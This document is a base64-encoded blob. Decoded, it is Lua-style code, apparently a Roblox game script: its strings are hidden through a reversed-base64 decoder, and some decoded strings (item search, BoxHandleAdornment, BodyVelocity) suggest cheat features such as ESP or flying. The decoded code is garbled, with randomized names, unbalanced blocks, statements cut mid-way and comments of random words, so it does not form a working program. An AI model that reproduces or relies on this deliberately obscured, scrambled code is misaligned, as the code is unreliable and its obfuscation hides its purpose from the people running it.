tmdygwLCA1MCwgMCkpCikKICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZ2S1didUtBdHAudWlsSnJhVVJmSiA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ITHBhVkNjTUF1IikKCiAgICAgICAga0ZwYlhOaUlETyA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIHpEQ2hTSGVLcWEuekdvZFJqaUhleCB0aGVuCi0tIG9tUE5tUmZKV1QgY2FrQk5jR2JRbQoKICAgICAgICBlbmQKICAgICAgICBzSUZNTmJNaXBRID0gZmFsc2UKICAgICAgICByZXR1cm4KICAgICAgICBzbXprZmRYWVdkCkZRSEl2TGNVWk0udGp1V2xUc1h6ZSA9IFhpd1plam1wQngKICAgIGZ1bmN0aW9uKCkKLS0gQXhwUW5Fc3RtTCBMR25qcmZ1WXNhIFFMSWhWdFJpak4gVWJJWkFLb3JnQiBrWU9XUlVqZnJyIHRBWGJXenNYQ2IKKQogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1WQ3BWV0tvWmZRIiksCiAgICBjVFFkUk1IUGJVLmlRemZDWHdMaHo6YnBCUmhXY0ZjcCgKICAgICAgICBsb2NhbCBIYUlwRVZkZlNhID0gQ21ldm5iakJQWigpCiAgICAgICAgc216a2ZkWFlXZApsb2NhbCBYV3ZoT1F3WUdPID0gY1RRZFJNSFBiVS56WHhYdENodGR5OnhjVnhnbWdNYlEoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9b2ZVT1pRTm1RTCIpLCB7CgogICAgZW5kCmxvY2FsIGpUZXZmYXVqcGogPSBmYWxzZQoKICAgICAgICAgICAgICAgICAgICB7CiAgICB7CiAgICBlbmQKaWYgTkFUQ1FwcFZBUSB0aGVuCi0tIERpS09DZFNvSkcuUHNTb1hmb3pxUCA9IFdETVBoQWFBb20udHRCQnpoWlRISygiTElZbEV3VFZGdSIpIC0tIFRBZVpMd1Jkb08gTGp1RXNFblRTViBVVUphQWpWT2NoIGdpeFhQaHNhSkkgTU5YTlpjVktOTSBBUkRmZ2pTblB0CgogICAgICAgIFFwUUN6QlVWQ2coV0RNUGhBYUFvbS50dEJCemhaVEhLKCJMQVZJWXB2eUxVIikpCiAgICAgICAgICAgICAgICBzWlhtTUZZVXFOID0gMwogICAgICAgICAgICAgICAgUHlkeFR4c0VEQS5ETnZPSXNNWFZlLlVjTUJPck51dmQ6eUl3UnpURHZrSShIUFpzUHNsa1ZBOndOcUppVGR5cFUoTGZpYXhoSGxpVykpCiAgICAgICAgZW5kCiAgICAgICAgZW5kCgopCiAgICAgICAgICAgIHBTUGhOckZZTGkuTkFUQ1FwcFZBUS5yd1ZnSEVOalhjLm5uWm1Xc3hyUkYuelhNb3BmQ2VMQyA9IGJFaElxVHpvVHQgcFNQaE5yRllMaS5OQVRDUXBwVkFRLnJ3VmdIRU5qWGMubm5abVdzeHJSRi56WE1vcGZDZUxDCgoKICAgIHFXSWFMTFRuQW0gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj0wV1owbEdJdUZHSXk5bVpnZzJZeUZXWnpCeWIwQlNad2xIViIpLAoKICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbigpCiAgICBlbmQKCiAgICAgICAgICAgIGlmIFhndE5EUGNjbXEgdGhlbiBYZ3RORFBjY21xOkJYdERuc3d1TUUoKSBlbmQKICAgICAgICBGQXdRVEpmYWlzID0gdHJ1ZSwgLS0gbU9HZ1BLdk9PRiBPYVFaeWZmYWFHIE1OWE5aY1ZLTk0gUVNwaWV6R3ljRwogICAgICAgIEFZbHhzRGpOblEuRmhXWldCT2FTbChmdW5jdGlvbigpCgoKICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgUWVKTUxTRENiUC5VZVBYR2RQSmhPLnBZaUZGWkFPVlQ6VWN0Y0tkREtySSg5OCwgMSkKICAgIGxvY2FsIHhMVlZ3Q05NVXIgPSBaY2ZvVkJzb0RBLmFpRFVrTmhkZVooKGZ6V0lzSXZ5c3kgJSAzNjAwKSAvIDYwKQogICAgICAgIHNJRk1OYk1pcFEgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjE0Q00iKSwKICAgICAgICAgICAgICAgIGlmIHpEQ2hTSGVLcWEuSmJkWHJYZGdWUiB0aGVuCnZubkhLd0hyem06SlBFc29na2diVCgKCiAgICBjeW1rR1llV3RJOmN5T2dWR2lBcHkoCmxvY2FsIGZ1bmN0aW9uIHFEeUhzU0F4R2QoelZubElubHpQTikKICAgICAgICAgICAgdXJpVENESGRnSihOZFNna2h4dmRNKQpNcHBiaVhYYW9JLmhFbElNWlRzZ2sgPSAwLjIKICAgICAgICAgICAgSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPWplV3l4aFBTTFAiKSkudEVadkFPQWtBQTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPVR0R1BaaVhFQWYiKSkKKQogICAgZW5kCiAgICBlbmQKKQogICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMCkKZUNJaFJVUWdQczpJZnRUZGliQmtoKGNUUWRSTUhQYlUuREVaS052a1B1UikKICAgICAgICBuUndXek1MZ0tBID0gREtPZ2hkanByYwogICAgbG9jYWwgVWNNQk9yTnV2ZCA9IEROdk9Jc01YVmU6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1ycnlaaVlOb2NMIikpCikKICAgIH0KY1RRZFJNSFBiVS5pTGRvcEdXVUtSOmJwQlJoV2NGY3AoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJiSkFtenNRR3hDIiksIHsKICAgICAgICBpZiBFY3p2alVOUkZJIHRoZW4KICAgICAgICAgICAgYm1GRnZISllWVy50anVXbFRzWHplID0gc0dMVFJPZUZ0bwogICAgfQpsb2NhbCBOdW9ybUZjTVpaID0KbG9jYWwgTkxWV05uVVphSyA9IGNUUWRSTUhQYlUuU0diSWpKRkVpbjpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygiPTBXWjA5R1YiKSkKKQogICAgICAgICAgICBpZiBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9ZENXaEloU0dlUSIpKS5LR2hqS2ZwTmhVOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI1dDJVIikpIHRoZW4KICAgICAgICApCikKKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgewotLSAtLSB4TlhweXpHR0NSIHZKTG9obnZKYWQgSnFpUGtIS0VNZyBTQWtlQXN1R0VUCiAgICAgICAgICAgIHNtemtmZFhZV2QKICAgICAgICAgICAgWVhtTWpZb2NOcC5sYWluT2tnS2Z3KDEsIHFaS0llTmlXR3UueGNlbktoTm9QWC5FYW9TYnVhdGtELCBxWktJZU5pV0d1LkRMdEttbG1EZ1MuYlFxSmxBVEJCbSksCikKICAgICAgICBlbmQKCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1uTlFXSHBlanRwIiksCiAgICAgICAgICAgICAgICB5T3FDdWNxUm9zLlRTcXREUm1pUXUgPSB0QnpkTkJjWE5mLm5Sa0VyR0puSncoMjU1LCAyNTUsIDI1NSkKCiAgICBlbmQKbG9jYWwgdG1aZGRrbUdNciA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09YlpySlhPc25NRiIpKQogICAgICAgICAgICAgICAgICAgIGlmIFhETnJMZ0RMa3MgQnh0UFVmVFJUSiBYRE5yTGdETGtzOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9VUlQVExCV3ZuRyIpKSB0aGVuCiAgICBpZiBVYklaQUtvcmdCOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ6bGZyc1RFaWJ4IikpIHRoZW4KICAgICAgICBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9amVXeXhoUFNMUCIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiV1pIUG5vTEtjcyIpLCA5ZTkpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Y1BvV0x4REZISiIpLCA5ZTkpOmRlQnJNbU9pZEooCkNkYlR5TndES3g6SlBFc29na2diVCgKICAgIGpwcU15V1VHU0YgPSBPS3FJclpyd2RuLAoKICAgICAgICBkSktyRm1XcHlYID0gUG5RVFFFZWxXSS5oZGhEYUVBRkxBLkhnc0Rtblh5Z1cKICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBxTkZLSm9zT3JZID0gUWVKTUxTRENiUDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiY2hoenVuU29MSiIpKQogICAgICAgIGVsUHRnTWh2UXQgPSBQblFUUUVlbFdJLkNkYlR5TndES3guSGdzRG1uWHlnVwogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ4Z0pXbGNCaVJiIiksCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQopCm1nT2NiVVpKWEk6bmxTQWlpY1hpdSgpCi0tIGxxaXNwWUZSUHkgZldCbmJDWnBRQyB2V1FnUFNiZUdVIGptRmhoWFdoVWYgWHZJb1NjUmtRRiBMcXlVeWxEWUNsCmxvY2FsIGRKS3JGbVdweVggPSBmYWxzZQoKICAgIGlmIGJFaElxVHpvVHQgQVhUYnpFTFBIdCB0aGVuCiAgICBlbmQKICAgICAgICAgICAgbG9jYWwgUGFqdlBqbm14UCA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09YlpySlhPc25NRiIpKS5QeWR4VHhzRURBCgoKICAgICAgICBsb2NhbCBMZmlheGhIbGlXID0gU25GQ2Jaalh2by5kalVDTm9MZVhUW1B5ZHhUeHNFREEudWlsSnJhVVJmSl0uTWtobHVWVlBpbi5Cb0xodmZ5WkptLkhnc0Rtblh5Z1cKbG9jYWwgaURPU2d0SXdoeSA9IGNUUWRSTUhQYlUuaUxkb3BHV1VLUjpicEJSaFdjRmNwKFdETVBoQWFBb20udHRCQnpoWlRISygiPVJvU2VHdXdrWnciKSwge3RhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjBOWFlEQnliMFZYUSIpLCBzSUZNTmJNaXBRID0gZmFsc2V9KQogICAgICAgICAgICAgICAgZkJUdFllVm9vZDprYmd4ZWxoWU9zKHF5S0dSeUZiWWYgLi4gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9NEdYIikgLi4gWGZCT2JJYVNqaSkgLS0gdVBFbkdYWHhCYyBcU1dKTlhUU1pJWiBiZldPSkxXWnJOIFRncUZMQmNHd3Agdk90WFB2R2NhdwogICAgICAgIH0Kd25KSm1CdGZGbDpKUEVzb2drZ2JUKAopCm1ra0lYaHlGWnE6Z1V6Y21uZWxyeCh7fSkKbWtrSVhoeUZacTpjaWtqVVF3VlFxKCkKLS0gb3FOUmlKWnNHWCB0QVhiV3pzWENiIEpqU3NqdlBmbUggZlVhZGFXVWRIdSBTbkZDYlpqWHZvCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIE5BVENRcHBWQVE6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImRQT05zT0R0WUgiKSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbmRrSHJYTkVnSSA9IGRldmNUTEdjaXEoU1JDZUNkY2p6Yy5IZ3NEbW5YeWdXKSBFY0l5cE9rUVlVIDAKICAgICAgICAgICAgICAgIGlmIEROdk9Jc01YVmUgQnh0UFVmVFJUSiBETnZPSXNNWFZlOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWdIekFlV1F2TkEiKSkgdGhlbgogICAga0ZwYlhOaUlETyA9IGZ1bmN0aW9uKHNjVVloRHFBTFMpCiAgICAgICAgc0lGTU5iTWlwUSA9IFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISygiIikpKSkpKSksCiAgICAgICAgICAgICAgICBzR0xUUk9lRnRvOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9eHBmZnN0cmtjQyIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPT1hdElZTWRJYmxRIikpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCJldlVEVXhYY0VvIikpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCJldlVEVXhYY0VvIikpOkVMamN5R2Z4a3ooCiAgICAgICAgICAgIGVuZAogICAgICAgIHlYa1pIV0hhWU4gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInZPTlFlSk5RRmkiKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgLS0gbkNnUGhqUmNPcyB2V1FnUFNiZUdVIEpvcVFwZVZLV28sIHdGUnBjQXhacGQgTXFjd0JsaVZ5ciBySlZGdnFCa0haIEJQWWVXUUtDa04KbG9jYWwgS2RlR011QU9JYSA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09YlpySlhPc25NRiIpKS5QeWR4VHhzRURBCiAgICAgICAgTU94V1BsUE1xei5KdGhmektJV2hXID0gTktNSXRITVhnWSgwLjEyKQoKZW5kKQoKSFVtRnJ0a3FtVjp4RkZVSlRSVXpDKAogICAgICAgIFB1THFCQ0xpWGYgdHJ1ZSBMSldUZGJQYWx3CiAgICAgICAgSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREEuRE52T0lzTVhWZS5VY01CT3JOdXZkOnlJd1J6VER2a0koQWtlRUVXUnhkaCkKICAgICAgICAgICAgICAgIHVWRGpvZ1VOU3AgdllrVHVpWnZWZC5Zc2NmV09GWGN0ID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ZYXFKckZleEVYIikgdGhlbgoKLS0gSHFmWGFzdk93SyBiZldPSkxXWnJOIEZzYlBHZGRvV0ggQWxtR1FieEJxdSBoelBud3NKaWVwCikKKQotLSBIYkF2VWNib2RGOgogICAgICAgICAgICAgICAgICAgIG1laXpnUUJCWmkgPSBGT2lVTk5ZSEpRIEJ4dFBVZlRSVEogRk9pVU5OWUhKUS5IZ3NEbW5YeWdXIEVjSXlwT2tRWVUgbmlsCi0tIHlaWGZrRVhQQ20uSnRoZnpLSVdoVyA9IFFzeUN3blBNVVkubGFpbk9rZ0tmdygwLjQ1LCAwLCAwLjUsIDApIC0tIFJXaGh3SU5NRmogbUR1dmdRd2ltTyBCakhzQ2ZqSUR2IGlzWVFBVE5QUUEgeVBqZldNaFNERCBWTlh0bHZ6akdKIFlGZ1NmTlpXTmEKCiAgICAgICAgICAgIGxvY2FsIFJncmF1WWhNaHMgPSBkZXZjVExHY2lxKHpJcFpDRUVWc00pCiAgICAgICAgc0lGTU5iTWlwUSA9IENqZHF0cXNRbEkKCiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9d0VrdUxHV2NPeSIpLAotLSBXekt3b1ZycVBsIGJmV09KTFdack4gU0diSWpKRkVpbiBCdUFzT0hrU1ZCIHF0a3pCdFdJdmkKICAgICAgICAgICAgICAgIHNtemtmZFhZV2QKWGl3WmVqbXBCeC5rRGJzQ2Nuc3hZID0gcVpLSWVOaVdHdS5rRGJzQ2Nuc3hZLm5JdHhyb1RIUlYgLS0geU5heGNEQ1VwRyBRUmdtTVdMVGpSIFRqQ1llVUJJbloKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBuQ2dQaGpSY09zIHZXUWdQU2JlR1UgR2lKTXBqUERNVywgWWVyY2x0Q0F5ViBOaEZPYmRtSHZ5IGRiR0drRmVRV2cgTXFjd0JsaVZ5ciBwWlJ3ZFRBQlZjIElibm5hY1pmelkgKDIwIHRnRXp0WkpSS2YpCiAgICAgICAgaWYgZVBMeVd6YnB2bFtKalpsUFN2bUFPXSB0aGVuCiAgICBlbmQKICAgICAgICBzSUZNTmJNaXBRID0gZmFsc2UKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgeGpMaWZ2S2FPawogICAgICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVpZYUdLcUxnZGMiKSwKLS0gV3pLd29WcnFQbCBtR3BydEtQYWtQCiAgICAgICAgICAgIHVyaVRDREhkZ0ooTmRTZ2toeHZkTSkKICAgIHsKICAgICAgICB2Tm5tSG5JWGNXOkljZUZVaG52cXMoMCwgMCwgMCwgZmFsc2UsIElSd1ZsTEhLTXUsIDApIC0tIFlQTkluY29xc1EgaldZSEJ4ZlZUdgoKKQpYaXdaZWptcEJ4LnRqdVdsVHNYemUgPSBmUHZoTnRJTFN4CiAgICAgICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUJKSU5QT3d6TlAiKSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9TmhwTUF0U21GSCIpLCBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1PSGFKQWpFRW52IiksCmZQdmhOdElMU3guVWhpdVRQblhVRCA9IHRydWUKfSkKCiAgICBlbmQKICAgICAgICBlbmQKbG9jYWwgT0txSXJacndkbiA9IHt9CiAgICAgICAgICAgICAgICAgICAgaWYgdkhTb0R5TmNyRTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPUhSRUtWZGpMQk4iKSkgQnh0UFVmVFJUSiB2SFNvRHlOY3JFLlp5S2FIY1RxaUcgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBrcU5VcGlQY0tjKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1nb2liY1RsbE1TIiksIExZS2Z5UUFjU0UpCiAgICAgICAgICAgIGlmIHluU2pJUURuTnMgdGhlbgogICAgICAgIC0tIFRBZVpMd1Jkb08gT2FRWnlmZmFhRyAzIExqdUVzRW5UU1YgQUVhTHdvaHV6YyBNTlhOWmNWS05NIEhLWGNHTmpBSm4gZURyREhWcWZqdCBWdVhVck9melRUIFROaHJwTWVSVXQKICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbihzY1VZaERxQUxTKQogICAgKQogICAgICAgICAgICAgICAgICAgIFB1THFCQ0xpWGYgZEVteVlDUlJLUyBCeHRQVWZUUlRKIFB5ZHhUeHNFREEuRE52T0lzTVhWZTp3TnFKaVRkeXBVKExmaWF4aEhsaVcpIExKV1RkYlBhbHcKCiAgICBpZiBueGlpUllCeEZZIHRoZW4KLS0gbG9jYWwgSHFHeFBiZHJNYyA9IGNUUWRSTUhQYlUuSHFHeFBiZHJNYzpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygiPWFLUFJQY0FVemwiKSkvCmxvY2FsIGJ3ZUpxSHpVTUkgPSBjVFFkUk1IUGJVLnp3VUxUUnFvQ1U6cW9MVHdwVHVoWShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1sY3dza2dvekRCIikpCiAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1xakV2bFFCcFVNIiksCiAgICAgICAgICAgICAgICAtLSB3Y3lKeWVjVWdTIFRCZnFpTUlxZlAtb3B6eEhRUnZHZQopCiAgICAgICAgICAgICAgICBOV1ZPblR0SGRvOmNSdWRNT1FCWksoKQogICAgICAgICAgICBbM10gPSAxLAogICAgICAgICAgICAgICAgICAgIC0tIG5DZ1BoalJjT3MgVm1wV0l3ckp6diBrU0hxeEFOU1hDIFViSVpBS29yZ0IgTU5YTlpjVktOTSBBWFdSWW5kclRsLCBmRW9lU21PcG1JIGNUQWtwbU9DY0kKICAgICAgICAgICAgLS0gSGhKWVFvc3h5RyBST2hnQWhJb1d2IHRLcHZmaUVYcUsKICAgIGZ1bmN0aW9uKCkKICAgICAgICBzbXprZmRYWVdkCiAgICAgICAgICAgICAgICAgICAgb0hNTVN6Q0ROdSA9IHNHTFRST2VGdG8uREJkS1psbUl6Ri5VYUtGVVBodFN0OndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cHRNQUlDUVRMSyIpKQogICAgICAgICAgICAgICAgaWYgQnp0SlVzSlpKUiB0aGVuCiAgICBlbmQKICAgICAgICAgICAgICAgIEZBd1FUSmZhaXMgPSBmYWxzZSwKICAgICAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXlDb0Zja2dLTFYiKSwKICAgIH0KICAgIHJldHVybiBRc3lDd25QTVVZLmxhaW5Pa2dLZncoSER2S3dtVXJlRiAqIChPRmh3d01ZR1R5LlV1SldRVGFkQU8gLyAxOTIwKSwgMCwgSER2S3dtVXJlRiAqIChPRmh3d01ZR1R5LkxOcXJ5b3dBcGIgLyAxMDgwKSwgMCkKICAgICAgICBpZiBwU1BoTnJGWUxpIEJ4dFBVZlRSVEogcFNQaE5yRllMaTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygid2NMTnpad3BhcSIpKSBCeHRQVWZUUlRKIHBTUGhOckZZTGkuTkFUQ1FwcFZBUTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPUp5ZnZJQ1NKcmUiKSkgQnh0UFVmVFJUSiBwU1BoTnJGWUxpLk5BVENRcHBWQVEucndWZ0hFTmpYYzp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1id0ZMR1N5V0J4IikpIHRoZW4KCiAgICAgICAgZW5kKQplbmQKICAgIHVpbEpyYVVSZkogPSBsRnZqckpHbW1UOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWNaZUNWRWZxRGsiKSkgQnh0UFVmVFJUSiBsRnZqckpHbW1ULmFMZ0RBRHZyUVIuZ3RETHBiek1tdiBFY0l5cE9rUVlVIElSd1ZsTEhLTXUudG1aZGRrbUdNci5QeWR4VHhzRURBLnVpbEpyYVVSZkosCiAgICBNcHBiaVhYYW9JLAogICAgICAgICAgICAgICAgICAgIGlmIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09b2haeGhUc3VrTSIpKSBFY0l5cE9rUVlVIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj00MmJwNVdWIikpIEVjSXlwT2tRWVUgdkhTb0R5TmNyRTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPUhSRUtWZGpMQk4iKSkgdGhlbgplbmQKZUNJaFJVUWdQczpXS0lXU0lEV0dsKFdETVBoQWFBb20udHRCQnpoWlRISygiaE1aWFlrYnVPYyIpKQogICAgICAgICAgICAgICAgQU15Y0tBUWhoYShaY2ZvVkJzb0RBLlFtdm91dlFHbVIoMC4xLCAwLjMpKQogICAgaWYgYkVoSXFUem9UdCB2WWtUdWladlZkLlpMT1hSSkZzUHQgdGhlbgogICAgICAgIG9iUEtoeW91Z1QuaU5WUE5lSmVCYTpuenZGeFRDRGNEKGZ1bmN0aW9uKENYWElIb0lFR2QpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdnpsYUxDdGV4eSA9IEJ6dEpVc0paSlI6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09Z0h6QWVXUXZOQSIpKQogICAgICAgICAgICAgICAgSmJkWHJYZGdWUiA9IHRydWUsCiAgICBsb2NhbCBjWHVWb1ZxcWdsID0gZmlNbXdvR0hUZC5sYWluT2tnS2Z3KFdETVBoQWFBb20udHRCQnpoWlRISygiMDVXWnQ1bWN2UldRbHhHWnVGR1M0OW1RIikpCiAgICBsb2NhbCBydFlZSllRcG9VID0ge30KICAgIH0KICAgIGZ1bmN0aW9uKERLT2doZGpwcmMpCiAgICAgICAgICAgICAgICAgICAgICAgIFBDYVFQc1hMbE4gPSBuaWwKLS0gU0diSWpKRkVpbiBCdUFzT0hrU1ZCIGpuWGppeHNiRGIgQnp5eU1UYVhjTgogICAgewotLSBrcm9PeVJ2U1JDIEVIS2xzb0JkdFMgRUVESndMSFB5ZSBIVW1GcnRrcW1WCmxvY2FsIGJ3ZUpxSHpVTUkgPSBjVFFkUk1IUGJVLnpYeFh0Q2h0ZHk6cW9MVHdwVHVoWShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09R3RHdlBIekp3RiIpKQogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYKICAgICAgICAtLSBzRnFOSXF1Q1JLIFllcmNsdENBeVYgTXFjd0JsaVZ5ciBJYm5uYWNaZnpZIGZXQm5iQ1pwUUMgdldRZ1BTYmVHVSBmUU1SUXhkckVvCiAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9TkVMSVZPU3Z6YyIpLApsb2NhbCBmdW5jdGlvbiB1QkRabXBnWEZ5KCkKICAgICAgICAgICAgICAgICAgICBQQ2FRUHNYTGxOID0gZmlNbXdvR0hUZC5sYWluT2tnS2Z3KFdETVBoQWFBb20udHRCQnpoWlRISygiNVJYYWo5R2JsWlZlazltUSIpKQogICAgICAgICAgICBTVXBjYUdmTW96LnRqdVdsVHNYemUgPSBuaWwKLS0geVpYZmtFWFBDbS5abnRJaFFZQ0t3ID0gMQogICAgICAgICAgICAgICAgSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREEuRE52T0lzTVhWZS5zbEptY3RVSlpNLm1YbHNDcHhOdnIgPSBkTlpRU3pRak1vCiAgICAgICAgICAgIGVuZApsb2NhbCBid2VKcUh6VU1JID0gY1RRZFJNSFBiVS5TR2JJakpGRWluOnFvTFR3cFR1aFkoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVN3b2xpVVdkT2QiKSkKCiAgICAgICAgICAgICAgICApCiAgICBsb2NhbCBBWFRiekVMUEh0ID0gREJkS1psbUl6RiBCeHRQVWZUUlRKIERCZEtabG1JekY6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09WUZhY0hRU2pDUCIpLCA1KQogICAgY1RRZFJNSFBiVS5pTGRvcEdXVUtSOmJwQlJoV2NGY3AoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ4dGhhQ1FmWm5kIiksIHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJRY1FsWkpMeE1IIiksIHFXSWFMTFRuQW0gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIm1EdURWSGloWnoiKSwgc0lGTU5iTWlwUSA9IGZhbHNlfSkKLS0gYUtsUU1xR21sWSB6U3RhV1ZVWVBsIFhRWmVNaXpkQU0geXBtSXF1QVZ0TiBZUXlqaU9kQlBFIENLbXVETUFqRU8gZXRnY2R3SVhHcyQKbG9jYWwgZnVuY3Rpb24gWEJlSHhEaFFVcShsQVZieUdlbnBELCB4aE5hdUNYaklPKQogICAgICAgICAgICAgICAgKQoKICAgICAgICBzbXprZmRYWVdkCmxvY2FsIGZ1bmN0aW9uIFdKU0lWckVXc3IoKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQsCiAgICAgICAgZW5kCmVuZAoKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJpeXdYTnRRZUljIiksCiAgICAgICAgICAgICAgICB1VkRqb2dVTlNwIHZZa1R1aVp2VmQuWXNjZldPRlhjdCA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1OaHBNQXRTbUZIIikgdGhlbgogICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEobmRrSHJYTkVnSSkgLS0gUXJJeHdaY3RmRCBuZGtIclhORWdJIGZVYWRhV1VkSHUgeklwWkNFRVZzTQpwU1BoTnJGWUxpLm1IVU1SRnhkTGs6bnp2RnhUQ0RjRCgKKQoKICAgICAgICAgICAgKQpJR05GeXdNdnZmID0gZmFsc2UgLS0gUnRrVndMY1NhbyBBbG1HUWJ4QnF1CmVuZCkKbG9jYWwgbXRVREdpdWdDSyA9IG5pbAogICAgICAgICAgICBFY3p2alVOUkZJID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBQQ2FRUHNYTGxOOmNuRWxPdVZzWUgoKQogICAgICAgICAgICB7CiAgICBZWG1NallvY05wLmxhaW5Pa2dLZncoMSwgcVpLSWVOaVdHdS54Y2VuS2hOb1BYLkVhb1NidWF0a0QsIHFaS0llTmlXR3UuREx0S21sbURnUy5iUXFKbEFUQkJtKSwKICAgICAgICBzSUZNTmJNaXBRID0gZmFsc2UsCiAgICBlbmQKCiAgICAgICAgbG9jYWwgS2FHdF